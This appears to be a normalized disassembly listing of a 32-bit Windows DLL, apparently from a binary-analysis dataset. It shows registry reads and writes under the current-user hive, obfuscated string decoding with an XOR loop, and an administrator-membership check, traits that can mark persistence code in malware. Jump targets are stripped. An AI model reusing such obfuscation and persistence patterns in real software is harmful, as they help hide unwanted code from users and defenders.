mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x318 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0xb8 ]
push edx
push 0x80000001
mov [ ebp - 0x66 ] ax
call esi
test eax eax
je r-xdata
xor eax eax
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x314 ]
[ edi ]
lea edx [ ebp - 0x3c ]
mov eax 0x12b
mov [ ebp - 0x31c ] 0x206
call sub_10045930
lea eax [ ebp - 0x31c ]
push eax
mov eax [ ebp - 0x318 ]
lea ecx [ ebp - 0x314 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
mov edi [ RegCloseKey@IAT ]
push ecx
call edi
lea edx [ ebp - 0x10c ]
mov eax 0x55
call sub_10045930
lea edx [ ebp - 0x318 ]
push edx
push 0x2
push 0x0
lea eax [ ebp - 0x10c ]
push eax
push 0x80000001
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x12d
call sub_10045930
mov ecx edx
push ecx
lea edx [ ebp - 0x314 ]
push edx
call [ StrCmpW@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x106
call sub_10045930
lea edx [ ebp - 0xc ]
mov eax 0xd0
call sub_10045930
mov eax [ ebp - 0x318 ]
push 0x6
mov ecx edx
push ecx
push 0x1
push 0x0
lea edx [ ebp - 0x64 ]
push edx
push eax
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x318 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x318 ]
push edx
call edi
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
push ecx
call edi
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10034e74
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
movsx ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax ecx
leave
retn
sub_10034e98
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_1000830a
pop ecx
sub_10034ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_10034e98
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001706d
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10069747
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10041140
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_10034e98
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_1002c57b
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10024fe9
lea ecx [ ebp + 0x8 ]
call sub_10069747
push esi
call sub_10062b65
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10035000
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_1000831a
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_10006cb0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10035060
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_100350a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
call sub_1001da0a
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x8
push eax
call sub_1005c227
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add esi 0x2
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_100128f4
fld [ eax + 0x10 ]
add esp 0xc
cmp [ ebp - 0x20 ] 0x0
je r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x24 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10001e8b
leave
retn
mov eax [ ebp - 0x24 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10035136
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1001d099
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003bfa8
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_10006b0d
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_10035200
push ebp
mov ebp esp
push 0xffffffff
push sub_100867f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_10021850
mov eax [ edi + 0x4 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1003525f
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1006ce53
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_100352fc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_10010b61
call sub_1007f503
add esp 0x10
pop esi
pop ebp
retn
sub_1003531e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_1006b85f
sub_10035350
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_1005ddc0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100353b0
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_1004db10
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100353e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087210
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x18 ] esi
add esi 0x1c
mov [ ebp - 0x14 ] 0x2
cmp esi [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ebx 0x7fff
call sub_1001cd91
mov edi eax
and edi ebx
cmp [ ebp - 0x14 ] ebx
jbe r-xdata
xor edx edx
mov eax edi
div [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
lea eax [ edx * 8 ]
sub eax edx
lea eax [ ecx + eax * 4 ]
cmp esi eax
je r-xdata
cmp ebx 0xffffffff
je r-xdata
inc [ ebp - 0x14 ]
add esi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov ebx [ esi + 0xc ]
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
mov ebx [ eax ]
mov [ esi ] ebx
mov ebx [ eax + 0x4 ]
mov [ esi + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
mov [ esi + 0x8 ] ebx
mov ebx [ eax + 0xc ]
mov [ esi + 0xc ] ebx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edx
mov edx [ eax + 0x10 ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0x10 ] edx
mov [ eax + 0x10 ] ecx
mov edx [ eax + 0x14 ]
mov ecx [ esi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ eax + 0x14 ] ecx
call sub_1001cd91
shl ebx 0xf
and eax 0x7fff
shl edi 0xf
or ebx 0x7fff
or edi eax
cmp ebx [ ebp - 0x14 ]
jb r-xdata
sub_100354f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087ee8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
xor eax eax
mov [ ebp - 0x38 ] ax
mov eax edi
mov [ ebp - 0x24 ] 0x7
mov [ ebp - 0x28 ] esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x38 ]
call sub_1005ddc0
mov [ ebp - 0x4 ] esi
mov edx [ ebp - 0x24 ]
mov esi [ ebp - 0x38 ]
mov ecx esi
cmp edx 0x8
jae r-xdata
mov eax esi
jmp r-xdata
lea ecx [ ebp - 0x38 ]
mov eax ecx
mov ebx [ ebp - 0x28 ]
lea ebx [ eax + ebx * 2 ]
mov eax esi
cmp edx 0x8
jae r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x38 ]
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
push ecx
lea ecx [ ebp - 0x3c ]
push ecx
call sub_10028730
add esp 0x8
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff5
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x4
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
lea eax [ ebp - 0x1c ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x38 ]
push edx
call sub_10056a70
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp [ ebp - 0x24 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x38 ]
call sub_1005ddc0
mov ebx [ ebp - 0x24 ]
mov ecx [ ebp - 0x38 ]
mov eax ecx
cmp ebx 0x8
jae r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_100187af
add esp 0x4
cmp [ eax ] 0x22
mov eax ecx
jne r-xdata
lea eax [ ebp - 0x38 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
cmp ebx 0x8
jae r-xdata
cmp ebx 0x8
jae r-xdata
lea esi [ esi + esi + 0x8 ]
push esi
push eax
push edi
call sub_1007f5d0
add esp 0xc
xor edx edx
mov [ esi + edi ] dx
lea eax [ ebp - 0x38 ]
lea esi [ esi + esi + 0x6 ]
push esi
add eax 0x2
push eax
push edi
call sub_1007f5d0
add esp 0xc
xor ecx ecx
mov [ esi + edi ] cx
jmp r-xdata
lea eax [ ebp - 0x38 ]
xor eax eax
mov eax [ ebp - 0x38 ]
push eax
call sub_100187af
add esp 0x4
cmp ebx 0x8
jb r-xdata
sub_100356ae
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100356d4
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10083a59
pop edi
pop ebp
retn
sub_10035700
call sub_1005a610
test eax eax
jne r-xdata
mov eax 0x1
retn
call sub_10024560
test eax eax
jne r-xdata
call sub_10017dc0
test eax eax
jne r-xdata
call sub_1005f150
test eax eax
jne r-xdata
call sub_10048620
test eax eax
jne r-xdata
call sub_100414f0
test eax eax
jne r-xdata
call sub_100219a0
test eax eax
je r-xdata
call sub_10013710
test eax eax
jne r-xdata
call sub_1002f170
test eax eax
jne r-xdata
push eax
push eax
push sub_10060c70
push sub_10038640
push eax
push eax
call sub_1000b29e
add esp 0x18
push eax
call [ CloseHandle@IAT ]
xor eax eax
retn
sub_10035780
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ edx + 0x3c4 ]
push esi
mov esi [ edx + 0x3c0 ]
push edi
mov edi eax
xor eax eax
cmp esi ecx
je r-xdata
mov esi [ edx + 0x3a0 ]
mov edx [ edx + 0x3a4 ]
cmp esi edx
je r-xdata
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
cmp edi [ ecx ]
je r-xdata
cmp esi ecx
je r-xdata
add esi 0x8
cmp esi ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
push ebx
push edx
add ecx 0x20
push ecx
call sub_10050ad0
mov ecx [ esi ]
mov eax [ ecx + 0x28 ]
add esi 0x4
cmp esi edx
jne r-xdata
mov ecx [ edx + 0x3d0 ]
mov edi [ edx + 0x3b0 ]
mov edx [ edx + 0x3b4 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
dec ecx
add eax edx
cmp eax ecx
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ecx + ecx * 8 ]
mov eax [ edi + ecx * 4 + 0x20 ]
lea edx [ edi + ecx * 4 ]
mov ecx [ esi + 0x4 ]
cmp ecx eax
jae r-xdata
push r--data
call sub_1002d84e
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea edi [ ecx + ebx ]
cmp edi eax
jae r-xdata
sub eax ecx
mov edi eax
mov edi ebx
jmp r-xdata
mov edx [ edx + 0x1c ]
mov eax [ ebp + 0x8 ]
push edi
add edx ecx
push edx
push eax
call sub_1007f5d0
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10035873
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_10026eb0
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_100358b0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x500
mov [ ebp - 0x10 ] ebx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
push eax
call [ FreeSid@IAT ]
sub_10035980
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
push eax
push edx
call sub_1002e070
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_10021bf0
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_100359d0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx + 0x15 ] 0x0
push esi
push edi
mov [ ebp - 0x4 ] ecx
je r-xdata
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
call sub_1004e420
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_1002d84e
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0xc ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x8 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
push edi
call sub_1000c240
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
call sub_100187af
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
cmp edi [ edx + 0x4 ]
je r-xdata
push edi
call sub_1002f150
mov ecx [ ebp - 0xc ]
add esp 0x4
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov esp ebp
pop ebp
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov [ esi + 0x14 ] 0x0
call sub_1004a090
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov [ esi + 0x14 ] 0x0
call sub_10072650
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov dl [ esi + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ eax ]
push esi
mov [ eax + 0x14 ] bl
call sub_1004a090
mov edx [ eax + 0x8 ]
mov [ edx + 0x14 ] bl
push eax
mov [ eax + 0x14 ] 0x0
call sub_10072650
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov dl [ esi + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ eax + 0x8 ]
push esi
mov [ eax + 0x14 ] bl
call sub_10072650
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x14 ] bl
push eax
mov [ eax + 0x14 ] 0x0
call sub_1004a090
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub_10035c1d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_1007fa90
lea esi [ eax + 0x1 ]
push esi
call sub_1000b33e
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_10057f0f
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_10035c70
push ebp
mov ebp esp
push 0xffffffff
push sub_10087f40
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
test [ eax + edi + 0x14 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test esi esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
